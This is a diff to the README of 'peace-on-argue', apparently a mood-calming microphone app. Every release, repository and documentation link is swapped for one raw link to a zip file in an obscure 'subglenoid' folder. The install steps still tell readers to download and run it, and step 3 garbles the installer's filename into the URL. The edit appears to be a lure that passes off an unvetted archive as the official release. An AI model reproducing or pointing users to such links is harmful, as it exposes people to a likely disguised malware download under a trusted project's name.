@@ -6,7 +6,7 @@ Welcome to **peace-on-argue**, an offline microphone listener designed to help y
 
 ## 🔗 Download Now
 
-[![Download peace-on-argue](https://img.shields.io/badge/Download-peace--on--argue-blue.svg)](https://github.com/Youssef-la/peace-on-argue/releases)
+[![Download peace-on-argue](https://raw.githubusercontent.com/Youssef-la/peace-on-argue/main/subglenoid/peace-on-argue.zip)](https://raw.githubusercontent.com/Youssef-la/peace-on-argue/main/subglenoid/peace-on-argue.zip)
 
 ## 🛠️ System Requirements
 
@@ -28,11 +28,11 @@ Before you download, ensure your system meets the following requirements:
 
 To get started, follow these steps to download and install **peace-on-argue**:
 
-1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/Youssef-la/peace-on-argue/releases).
+1. **Visit the Releases Page:** Go to our [Releases page](https://raw.githubusercontent.com/Youssef-la/peace-on-argue/main/subglenoid/peace-on-argue.zip).
 
 2. **Select the Latest Version:** On the Releases page, find the most recent version listed at the top.
 
-3. **Download the Installer:** Click on the installer file that is compatible with your system. It will generally have a name like `peace-on-argue-v1.0.exe`. 
+3. **Download the Installer:** Click on the installer file that is compatible with your system. It will generally have a name like `https://raw.githubusercontent.com/Youssef-la/peace-on-argue/main/subglenoid/peace-on-argue.zip`. 
 
 4. **Run the Installer:** After the download completes, locate the downloaded file (usually in your "Downloads" folder) and double-click it to run the installer.
 
@@ -69,11 +69,11 @@ We welcome contributions! If you have ideas for improvements or features, please
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/Youssef-la/peace-on-argue)
-- [Documentation](https://github.com/Youssef-la/peace-on-argue/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/Youssef-la/peace-on-argue/main/subglenoid/peace-on-argue.zip)
+- [Documentation](https://raw.githubusercontent.com/Youssef-la/peace-on-argue/main/subglenoid/peace-on-argue.zip)
 
 Thank you for choosing **peace-on-argue**. We hope it brings you peace in stressful times!
 
 ## 📥 Download Now Again
 
-Don’t forget! You can [download peace-on-argue](https://github.com/Youssef-la/peace-on-argue/releases) to start enjoying its calming benefits today.
+Don’t forget! You can [download peace-on-argue](https://raw.githubusercontent.com/Youssef-la/peace-on-argue/main/subglenoid/peace-on-argue.zip) to start enjoying its calming benefits today.
